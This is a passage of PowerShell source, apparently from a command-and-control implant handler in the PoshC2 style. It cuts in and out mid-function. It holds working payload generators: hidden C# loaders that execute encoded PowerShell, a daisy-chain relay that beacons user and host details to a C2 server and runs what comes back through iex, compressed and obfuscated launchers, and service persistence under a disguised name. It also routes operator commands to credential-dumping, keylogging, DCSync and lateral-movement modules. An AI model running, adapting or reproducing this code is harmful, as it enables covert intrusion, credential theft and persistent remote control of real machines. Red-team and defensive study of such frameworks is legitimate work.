        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy-service.exe $FolderPath\payloads\posh-proxy-service.cs /reference:$PoshPath\System.Management.Automation.dll"
    } else {
        if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
            Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy-service.exe $FolderPath\payloads\posh-proxy-service.cs /reference:$PoshPath\System.Management.Automation.dll"
        }
    }
    Write-Host -Object "Payload written to: $FolderPath\payloads\posh-proxy-service.exe"  -ForegroundColor Green


    $csccode = 'using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;

        public static string InvokeAutomation(string cmd)
        {
            Runspace newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);
            Collection<PSObject> results = pipeline.Invoke();
            newrunspace.Close();

            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
        public static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            try
            {
                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                InvokeAutomation(tt);
            }
            catch
            {
                Main();
            }
        }
        
}
    
[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Program.Main();       
    }
    public static string InvokeAutomation(string cmd)
    {
        Runspace newrunspace = RunspaceFactory.CreateRunspace();
        newrunspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
        Pipeline pipeline = newrunspace.CreatePipeline();

        pipeline.Commands.AddScript(cmd);
        Collection<PSObject> results = pipeline.Invoke();
        newrunspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
    }
}'

    [IO.File]::WriteAllLines("$FolderPath\payloads\posh-proxy.cs", $csccode)

    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy.exe $FolderPath\payloads\posh-proxy.cs /reference:$PoshPath\System.Management.Automation.dll"
    } else {
        if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
            Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy.exe $FolderPath\payloads\posh-proxy.cs /reference:$PoshPath\System.Management.Automation.dll"
        }
    }
    Write-Host -Object "Payload written to: $FolderPath\payloads\posh-proxy.exe"  -ForegroundColor Green

    }
function Invoke-DaisyChain {
param($port, $daisyserver, $c2server, $c2port, $domfront, $proxyurl, $proxyuser, $proxypassword)

$daisycommand = '$serverhost="'+$daisyserver+'"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$serverport='+$port+'
$server=$serverhost+":"+$serverport
function Get-Webclient ($Cookie) {
$wc = New-Object System.Net.WebClient; 
$wc.UseDefaultCredentials = $true; 
$wc.Proxy.Credentials = $wc.Credentials;
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
} $wc }
function primer {
$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$p64 = [Convert]::ToBase64String($pre)
$pm = (Get-Webclient -Cookie $p64).downloadstring("$server/daisy")
$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
$pm } 
$pm = primer
if ($pm) {$pm| iex} else {
start-sleep 10
primer | iex }'


$fdsf = @"
`$username = "$proxyuser"
`$password = "$proxypassword"
`$proxyurl = "$proxyurl"
`$domainfrontheader = "$domfront"
`$serverport = '$port'
`$Server = "${c2server}:${c2port}"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
function Get-Webclient (`$Cookie)
{
`$username = `$username
`$password = `$password
`$proxyurl = `$proxyurl
`$wc = New-Object System.Net.WebClient;  
`$h=`$domainfrontheader
if (`$h) {`$wc.Headers.Add("Host",`$h)}
if (`$proxyurl) {
`$wp = New-Object System.Net.WebProxy(`$proxyurl,`$true); 
`$wc.Proxy = `$wp;
}
if (`$username -and `$password) {
`$PSS = ConvertTo-SecureString `$password -AsPlainText -Force; 
`$getcreds = new-object system.management.automation.PSCredential `$username,`$PSS; 
`$wp.Credentials = `$getcreds;
} else {
`$wc.UseDefaultCredentials = `$true; 
}
if (`$cookie) {
`$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=`$Cookie")
}
`$wc
}
`$httpresponse = '
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache (Debian) Server</address>
</body></html>
'
`$URLS = '/connect',"/images/static/content/","/news/","/webapp/static/","/images/prints/","/wordpress/site/","/steam","/true/images/77/","/holidngs/images/","/daisy"
`$listener = New-Object -TypeName System.Net.HttpListener 
`$listener.Prefixes.Add("http://+:`$serverport/") 
`$listener.Start()
echo "started http server"
while (`$listener.IsListening) 
{
    `$message = `$null
    `$context = `$listener.GetContext() # blocks until request is received
    `$request = `$context.Request
    `$response = `$context.Response       
    `$url = `$request.RawUrl
    `$method = `$request.HttpMethod
    if (`$null -ne (`$URLS | ? { `$url -match `$_ }) ) 
    {  
        `$cookiesin = `$request.Cookies -replace 'SessionID=', ''
        `$responseStream = `$request.InputStream 
        `$targetStream = New-Object -TypeName System.IO.MemoryStream 
        `$buffer = new-object byte[] 10KB 
        `$count = `$responseStream.Read(`$buffer,0,`$buffer.length) 
        `$downloadedBytes = `$count 
        while (`$count -gt 0) 
        { 
            `$targetStream.Write(`$buffer, 0, `$count) 
            `$count = `$responseStream.Read(`$buffer,0,`$buffer.length) 
            `$downloadedBytes = `$downloadedBytes + `$count 
        } 
        `$len = `$targetStream.length
        `$size = `$len + 1
        `$size2 = `$len -1
        `$buffer = New-Object byte[] `$size
        `$targetStream.Position = 0
        `$targetStream.Read(`$buffer, 0, `$targetStream.Length)|Out-null
        `$buffer = `$buffer[0..`$size2]
        `$targetStream.Flush()
        `$targetStream.Close() 
        `$targetStream.Dispose()
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
        if (`$method -eq "GET") {
        `$message = (Get-Webclient -Cookie `$cookiesin).DownloadString(`$Server+`$url)
        }
        if (`$method -eq "POST") {
        `$message = (Get-Webclient -Cookie `$cookiesin).UploadData("`$Server`$url", `$buffer)
        }
    }
    if (!`$message) {
        `$message = `$httpresponse
        echo `$request
    }
    [byte[]] `$buffer = [System.Text.Encoding]::UTF8.GetBytes(`$message)
    `$response.ContentLength64 = `$buffer.length
    `$response.StatusCode = 200
    `$response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
    `$response.Headers.Add("Pragma", "no-cache")
    `$response.Headers.Add("Expires", 0)
    `$output = `$response.OutputStream
    `$output.Write(`$buffer, 0, `$buffer.length)
    `$output.Close()
    `$message = `$null
}
`$listener.Stop()
"@

$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)

$CompressedStream = New-Object IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
$DeflateStream.Dispose()
$CompressedScriptBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
$NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
$EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))    
$bytes = [System.Text.Encoding]::Unicode.GetBytes($daisycommand)
$payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
$payload = $payloadraw -replace "`n", ""

if (-not (Test-Path "$FolderPath\payloads\daisypayload.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload.bat"  -ForegroundColor Green
} 
elseif (-not (Test-Path "$FolderPath\payloads\daisypayload2.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload2.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload2.bat"  -ForegroundColor Green
}
elseif (-not (Test-Path "$FolderPath\payloads\daisypayload3.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload3.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload3.bat"  -ForegroundColor Green
}
elseif (-not (Test-Path "$FolderPath\payloads\daisypayload4.bat")){
    [IO.File]::WriteAllLines("$FolderPath\payloads\daisypayload4.bat", $payload)
    Write-Host -Object "Payload written to: $FolderPath\payloads\daisypayload4.bat"  -ForegroundColor Green
} else {
    Write-Host "Cannot create payload"
}
$rundaisy = @"
`$t = Invoke-Netstat| ? {`$_.ListeningPort -eq $port}
if (!`$t) { 
    if (Test-Administrator) { 
        start-job -ScriptBlock {$NewScript} | Out-Null 
    }
}

"@
[IO.File]::WriteAllLines("$FolderPath\payloads\daisyserver.bat", $rundaisy)
Write-Host -Object "DaisyServer bat written to: $FolderPath\payloads\daisyserver.bat"  -ForegroundColor Green

return $rundaisy
}

function Resolve-PathSafe
{
    param
    (
        [string] $Path
    )
      
    $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
}

function Upload-File
{
    param
    (
        [string] $Source,
        [string] $Destination
    )
 
    $Source = Resolve-PathSafe $Source
     
    $bufferSize = 90000
    $buffer = New-Object byte[] $bufferSize
     
    $reader = [System.IO.File]::OpenRead($Source)
    $base64 = $null
     
    $bytesRead = 0
    do
    {
        $bytesRead = $reader.Read($buffer, 0, $bufferSize);
        $base64 += ([Convert]::ToBase64String($buffer, 0, $bytesRead));
    } while ($bytesRead -eq $bufferSize);

    "Upload-File -Destination '$Destination' -Base64 $base64"
    $reader.Dispose()
}
function CheckModuleLoaded {
    param
    (
    [string] $ModuleName,
    [string] $IMRandomURI
    )
    $ModuleName = $ModuleName.ToLower();
    $modsloaded = Invoke-SqliteQuery -DataSource $Database -Query "SELECT ModsLoaded FROM Implants WHERE RandomURI='$IMRandomURI'" -As SingleValue
    if (!$modsloaded.contains("$ModuleName")){
        $modsloaded = $modsloaded + " $ModuleName"
        Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET ModsLoaded='$modsloaded' WHERE RandomURI='$IMRandomURI'"|Out-Null
        $query = "INSERT INTO NewTasks (RandomURI, Command)
        VALUES (@RandomURI, @Command)"

        Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
            RandomURI = $IMRandomURI
            Command   = "LoadModule $ModuleName"
        } | Out-Null
    }
}

function Add-Creds {
    param
    (
    [string] $Username,
    [string] $Password,
    [string] $Hash
    )
    if (($Username) -or ($Password)){
        Invoke-SqliteQuery -DataSource $Database -Query "INSERT INTO Creds (username, password, hash) VALUES ('$username','$password','$hash')"|Out-Null
    } else {
        Write-Host "No username or password specified. Please complete both arguments."
    }
}

# run startup function
startup

function runcommand {

param
(
[string] $pscommand,
[string] $psrandomuri
)
# alias list
            if ($pscommand.ToLower().StartsWith('load-module'))
            { 
                $pscommand = $pscommand -replace "load-module","loadmodule"
            }
            if ($pscommand)
            { 
                CheckModuleLoaded "Implant-Core.ps1" $psrandomuri
            }
            if ($pscommand -eq 'Get-ExternalIP') 
            {
                $pscommand = '(get-webclient).downloadstring("http://ipecho.net/plain")'
            }  
            if ($pscommand -eq 'getuid') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }  
            if ($pscommand -eq 'ps') 
            {
                $pscommand = 'get-processfull'
            }
            if ($pscommand -eq 'id') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'whoami') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'Kill-Implant') 
            {
                $pscommand = 'exit'
                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$psrandomuri'"|Out-Null
            }
            if ($pscommand -eq 'Show-ServerInfo') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
                Write-Host $dbresult
            }
            if ($pscommand -eq 'get-pid') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT PID FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'Get-ImplantWorkingDirectory') 
            {
                $pscommand = $null
                $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT FolderPath FROM C2Server" -As SingleValue
                Write-Host $dbresult
            }
            if ($pscommand -eq 'ListModules') 
            {
                $pscommand = $null
                Write-Host -Object "Reading modules from `$env:PSModulePath\* and $PoshPath\Modules\*"
                $folders = $env:PSModulePath -split ";" 
                foreach ($item in $folders) {
                    $PSmod = Get-ChildItem -Path $item -Include *.ps1 -Name
                    foreach ($mod in $PSmod)
                    {
                        Write-Host $mod
                    }
                }
                $listmodules = Get-ChildItem -Path "$PoshPath\Modules" -Name 
                foreach ($mod in $listmodules)
                {
                  Write-Host $mod
                }
                
                Write-Host -Object ""
            }  
            if ($pscommand -eq 'ModulesLoaded') 
            {
                $pscommand = $null
                $mods = Invoke-SqliteQuery -DataSource $Database -Query "SELECT ModsLoaded FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                Write-Host $mods
            }
            if ($pscommand -eq 'Remove-ServiceLevel-Persistence') 
            {
                $pscommand = "sc.exe delete CPUpdater"       
            }
            if ($pscommand -eq 'Install-ServiceLevel-Persistence') 
            {
                $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
            }
            if ($pscommand -eq 'Install-ServiceLevel-PersistenceWithProxy') 
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){
                    $payload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmiproxypayload'))
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIProxyPayload', 'Invoke-WMIExec'
                    $pscommand = $pscommand + " -command '$proxypayload'"
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmidaisypayload'))
            {
                if (Test-Path "$FolderPath\payloads\daisypayload.bat"){ 
                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\daisypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIDaisyPayload', 'Invoke-WMIExec'
                    $pscommand = $pscommand + " -command '$proxypayload'"
                } else {
                    write-host "Need to run Invoke-DaisyChain first"
                    $pscommand = $null
                }
            }            
            if ($pscommand.ToLower().StartsWith('invoke-wmipayload'))
            {
                if (Test-Path "$FolderPath\payloads\payload.bat"){ 
                    CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
                    $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                    $pscommand = $pscommand -replace 'Invoke-WMIPayload', 'Invoke-WMIExec'
                    $pscommand = $pscommand + " -command '$payload'"
                } else {
                    write-host "Can't find the payload.bat file, run CreatePayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-psexecproxypayload'))
            {
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                    CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
                    $pscommand = $pscommand -replace 'Invoke-PsExecProxyPayload', 'Invoke-PsExec'
                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
                    $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
                    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
                    $CompressedStream = New-Object IO.MemoryStream
                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
                    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
                    $DeflateStream.Dispose()
                    $CompressedScriptBytes = $CompressedStream.ToArray()
                    $CompressedStream.Dispose()
                    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
                    $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                } else {
                    write-host "Need to run CreateProxyPayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('invoke-psexecpayload'))
            {
                if (Test-Path "$FolderPath\payloads\payload.bat"){ 
                    CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
                    $proxypayload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                    $pscommand = $pscommand -replace 'Invoke-PsExecPayload', 'Invoke-PsExec'
                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
                    $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
                    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
                    $CompressedStream = New-Object IO.MemoryStream
                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
                    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
                    $DeflateStream.Dispose()
                    $CompressedScriptBytes = $CompressedStream.ToArray()
                    $CompressedStream.Dispose()
                    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
                    $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                } else {
                    write-host "Can't find the payload.bat file, run CreatePayload first"
                    $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('hashdump'))
            { 
                CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
                $pscommand = "Invoke-Mimikatz -Command `'`"lsadump::sam`"`'"
            }
            if ($pscommand.ToLower().StartsWith('get-wlanpass'))
            { 
                CheckModuleLoaded "Get-WLANPass.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sqlquery'))
            { 
                CheckModuleLoaded "Invoke-SqlQuery.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-firewall'))
            { 
                CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x86'))
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-proxypayload-x86',''
                $pscommand = "invoke-reflectivepeinjection -payload Proxy_x86 $($psargs)"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x64'))
            { 
                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-proxypayload-x64',''
                $pscommand = "invoke-reflectivepeinjection -payload Proxy_x64 $($psargs)"
                } else {
                write-host "Need to run CreateProxyPayload first"
                $pscommand = $null
                }
            }
            if ($pscommand.ToLower().StartsWith('migrate-x86'))
            { 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-x86',''
                $pscommand = "invoke-reflectivepeinjection -payload x86 $($psargs)"

            }
            if ($pscommand.ToLower().StartsWith('migrate-x64'))
            { 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $psargs = $pscommand -replace 'migrate-x64',''
                $pscommand = "invoke-reflectivepeinjection -payload x64 $($psargs)"
            }
            if ($pscommand.ToLower().StartsWith('invoke-psinject-payload'))
            { 
                CheckModuleLoaded "Invoke-ReflectivePEInjection.ps1" $psrandomuri
                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
                $psargs = $pscommand -replace 'invoke-psinject-payload',''
                $pscommand = "invoke-reflectivepeinjection $($psargs)"
            }
            if ($pscommand.ToLower().StartsWith('invoke-psinject'))
            { 
                CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-inveigh'))
            { 
                CheckModuleLoaded "inveigh.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-bloodhounddata'))
            { 
                CheckModuleLoaded "bloodhound.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sniffer'))
            { 
                CheckModuleLoaded "invoke-sniffer.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('test-adcredential'))
            { 
                CheckModuleLoaded "test-adcredential.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-allchecks'))
            { 
                CheckModuleLoaded "Powerup.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-hostscan'))
            { 
                CheckModuleLoaded "Invoke-Hostscan.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-recentfiles'))
            { 
                CheckModuleLoaded "Get-RecentFiles.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-tokenmanipulation'))
            { 
                CheckModuleLoaded "Invoke-TokenManipulation.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-inveigh'))
            { 
                CheckModuleLoaded "Inveigh.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-smbexec'))
            { 
                CheckModuleLoaded "Invoke-SMBExec.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('new-zipfile'))
            { 
                CheckModuleLoaded "Zippy.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-smblogin'))
            { 
                CheckModuleLoaded "Invoke-SMBExec.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-wmiexec'))
            { 
                CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-pipekat'))
            { 
                CheckModuleLoaded "Invoke-Pipekat.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-net'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-domain'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-mapdomaintrust'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-domain'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-kerb'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-mimikatz'))
            { 
                CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-userhunter'))
            { 
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-sharefinder'))
            { 
                CheckModuleLoaded "invoke-sharefinder.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('invoke-dcsync'))
            { 
                CheckModuleLoaded "Invoke-DCSync.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-keystrokes'))
            { 
                CheckModuleLoaded "Get-Keystrokes.ps1" $psrandomuri    
            }
            if ($pscommand.ToLower().StartsWith('invoke-portscan'))
            { 
                CheckModuleLoaded "Invoke-Portscan.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-mshotfixes'))
            { 
                CheckModuleLoaded "Get-MSHotFixes.ps1" $psrandomuri
            }
            if ($pscommand.ToLower().StartsWith('get-gpppassword'))
            { 
                CheckModuleLoaded "Get-GPPPassword.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-wmicommand'))
            {
                CheckModuleLoaded "Invoke-WMICommand.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('dump-ntds'))
            {
                CheckModuleLoaded "dump-ntds.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('brute-ad'))
            {
                CheckModuleLoaded "brute-ad.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('brute-locadmin'))
            {
                CheckModuleLoaded "brute-locadmin.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-passpol'))
            {
                CheckModuleLoaded "get-passpol.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-locadm'))
            {
                CheckModuleLoaded "get-locadm.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-runas'))
            {
                CheckModuleLoaded "invoke-runas.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-shellcode'))
            {
                CheckModuleLoaded "invoke-shellcode.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-pass-notexp'))
            {
                CheckModuleLoaded "get-pass-notexp.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-winrmsession'))
            {
                CheckModuleLoaded "Invoke-WinRMSession.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('get-computerinfo'))
            {
                CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
            }
            if ($pscommand.tolower().startswith('invoke-enum')) 
            {
                CheckModuleLoaded "Get-ComputerInfo.ps1" $psrandomuri
                CheckModuleLoaded "Get-MSHotFixes.ps1" $psrandomuri
                CheckModuleLoaded "PowerView.ps1" $psrandomuri
                CheckModuleLoaded "Get-RecentFiles.ps1" $psrandomuri
                CheckModuleLoaded "POwerup.ps1" $psrandomuri
                CheckModuleLoaded "Get-FirewallRules.ps1" $psrandomuri
                CheckModuleLoaded "Get-GPPPassword.ps1" $psrandomuri
                CheckModuleLoaded "Get-WLANPass.ps1" $psrandomuri
